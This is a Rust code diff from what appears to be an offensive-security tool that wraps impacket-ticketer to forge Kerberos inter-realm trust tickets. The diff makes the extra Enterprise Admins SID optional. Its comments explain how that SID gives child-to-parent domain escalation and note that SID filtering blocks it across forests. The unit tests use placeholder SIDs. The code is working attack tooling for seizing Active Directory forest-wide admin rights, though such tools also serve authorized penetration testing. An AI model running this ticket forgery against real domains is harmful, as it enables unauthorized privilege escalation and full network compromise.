@@ -36,24 +36,32 @@ pub async fn extract_trust_key(args: &Value) -> Result<ToolOutput> {
 ///
 /// Required args: `trust_key`, `source_sid`, `source_domain`, `target_sid`,
 ///                `target_domain`
-/// Optional args: `username`
+/// Optional args: `username`, `extra_sid`
+///
+/// For child-to-parent escalation (same forest), pass `extra_sid` with the
+/// parent domain Enterprise Admins SID (e.g. `S-1-5-21-…-519`).
+/// For cross-forest trusts, omit `extra_sid` — SID filtering blocks RIDs < 1000.
 pub async fn create_inter_realm_ticket(args: &Value) -> Result<ToolOutput> {
     let trust_key = required_str(args, "trust_key")?;
     let source_sid = required_str(args, "source_sid")?;
     let source_domain = required_str(args, "source_domain")?;
-    let target_sid = required_str(args, "target_sid")?;
+    let _target_sid = required_str(args, "target_sid")?;
     let target_domain = required_str(args, "target_domain")?;
     let username = optional_str(args, "username").unwrap_or("Administrator");
+    let extra_sid = optional_str(args, "extra_sid");
 
-    let extra_sid = format!("{target_sid}-519");
     let spn = format!("krbtgt/{target_domain}");
 
-    CommandBuilder::new("impacket-ticketer")
+    let mut cmd = CommandBuilder::new("impacket-ticketer")
         .flag("-nthash", trust_key)
         .flag("-domain-sid", source_sid)
-        .flag("-domain", source_domain)
-        .flag("-extra-sid", extra_sid)
-        .flag("-spn", spn)
+        .flag("-domain", source_domain);
+
+    if let Some(es) = extra_sid {
+        cmd = cmd.flag("-extra-sid", es);
+    }
+
+    cmd.flag("-spn", spn)
         .arg(username)
         .timeout_secs(120)
         .execute()
@@ -189,7 +197,8 @@ mod tests {
     }
 
     #[test]
-    fn create_inter_realm_ticket_extra_sid_format() {
+    fn create_inter_realm_ticket_extra_sid_optional() {
+        // Without extra_sid — cross-forest case
         let args = json!({
             "trust_key": "aabbccdd",
             "source_sid": "S-1-5-21-111",
@@ -197,9 +206,21 @@ mod tests {
             "target_sid": "S-1-5-21-222",
             "target_domain": "contoso.local"
         });
-        let target_sid = required_str(&args, "target_sid").unwrap();
-        let extra_sid = format!("{target_sid}-519");
-        assert_eq!(extra_sid, "S-1-5-21-222-519");
+        assert!(optional_str(&args, "extra_sid").is_none());
+    }
+
+    #[test]
+    fn create_inter_realm_ticket_extra_sid_child_to_parent() {
+        // With extra_sid — child-to-parent case
+        let args = json!({
+            "trust_key": "aabbccdd",
+            "source_sid": "S-1-5-21-111",
+            "source_domain": "child.contoso.local",
+            "target_sid": "S-1-5-21-222",
+            "target_domain": "contoso.local",
+            "extra_sid": "S-1-5-21-222-519"
+        });
+        assert_eq!(optional_str(&args, "extra_sid"), Some("S-1-5-21-222-519"));
     }
 
     #[test]
@@ -419,7 +440,7 @@ mod tests {
     }
 
     #[tokio::test]
-    async fn create_inter_realm_ticket_executes() {
+    async fn create_inter_realm_ticket_executes_without_extra_sid() {
         mock::push(mock::success());
         let args = json!({
             "trust_key": "aabbccdd",
@@ -427,6 +448,20 @@ mod tests {
             "source_domain": "child.contoso.local",
             "target_sid": "S-1-5-21-222",
             "target_domain": "contoso.local"
+        });
+        assert!(create_inter_realm_ticket(&args).await.is_ok());
+    }
+
+    #[tokio::test]
+    async fn create_inter_realm_ticket_executes_with_extra_sid() {
+        mock::push(mock::success());
+        let args = json!({
+            "trust_key": "aabbccdd",
+            "source_sid": "S-1-5-21-111",
+            "source_domain": "child.contoso.local",
+            "target_sid": "S-1-5-21-222",
+            "target_domain": "contoso.local",
+            "extra_sid": "S-1-5-21-222-519"
         });
         assert!(create_inter_realm_ticket(&args).await.is_ok());
     }
